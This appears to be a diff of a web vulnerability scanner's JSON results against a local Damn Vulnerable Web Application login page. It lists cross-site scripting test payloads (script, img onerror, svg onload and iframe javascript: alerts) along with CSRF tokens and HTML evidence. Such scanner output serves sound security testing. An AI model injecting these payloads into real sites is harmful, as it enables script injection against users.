@@ -1,5 +1,5 @@
 {
-    "total_vulnerabilities": 4,
+    "total_vulnerabilities": 3,
     "vulnerabilities": [
         {
             "url": "http://localhost:8080/login.php",
@@ -9,35 +9,7 @@
                 "username": "<script>alert('XSS')</script>",
                 "password": "<script>alert('XSS')</script>",
                 "Login": "Login",
-                "user_token": "4a7df57b5097ab3e2485b09d31c9bdbf"
-            },
-            "http_status": 200,
-            "detection_method": "behavioral_difference",
-            "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Login :: Damn Vulnerable Web Application (D"
-        },
-        {
-            "url": "http://localhost:8080/login.php",
-            "test_type": "form",
-            "target": "http://localhost:8080/login.php",
-            "payload": {
-                "username": "<img src=x onerror=alert('XSS')>",
-                "password": "<img src=x onerror=alert('XSS')>",
-                "Login": "Login",
-                "user_token": "4a7df57b5097ab3e2485b09d31c9bdbf"
-            },
-            "http_status": 200,
-            "detection_method": "behavioral_difference",
-            "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Login :: Damn Vulnerable Web Application (D"
-        },
-        {
-            "url": "http://localhost:8080/login.php",
-            "test_type": "form",
-            "target": "http://localhost:8080/login.php",
-            "payload": {
-                "username": "'><script>alert('XSS')</script>",
-                "password": "'><script>alert('XSS')</script>",
-                "Login": "Login",
-                "user_token": "4a7df57b5097ab3e2485b09d31c9bdbf"
+                "user_token": "56f6c31d9020bf9ca63d19c131a85eeb"
             },
             "http_status": 200,
             "detection_method": "behavioral_difference",
@@ -51,7 +23,21 @@
                 "username": "<svg onload=alert('XSS')>",
                 "password": "<svg onload=alert('XSS')>",
                 "Login": "Login",
-                "user_token": "4a7df57b5097ab3e2485b09d31c9bdbf"
+                "user_token": "56f6c31d9020bf9ca63d19c131a85eeb"
+            },
+            "http_status": 200,
+            "detection_method": "behavioral_difference",
+            "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Login :: Damn Vulnerable Web Application (D"
+        },
+        {
+            "url": "http://localhost:8080/login.php",
+            "test_type": "form",
+            "target": "http://localhost:8080/login.php",
+            "payload": {
+                "username": "<iframe src='javascript:alert(1)'></iframe>",
+                "password": "<iframe src='javascript:alert(1)'></iframe>",
+                "Login": "Login",
+                "user_token": "56f6c31d9020bf9ca63d19c131a85eeb"
             },
             "http_status": 200,
             "detection_method": "behavioral_difference",
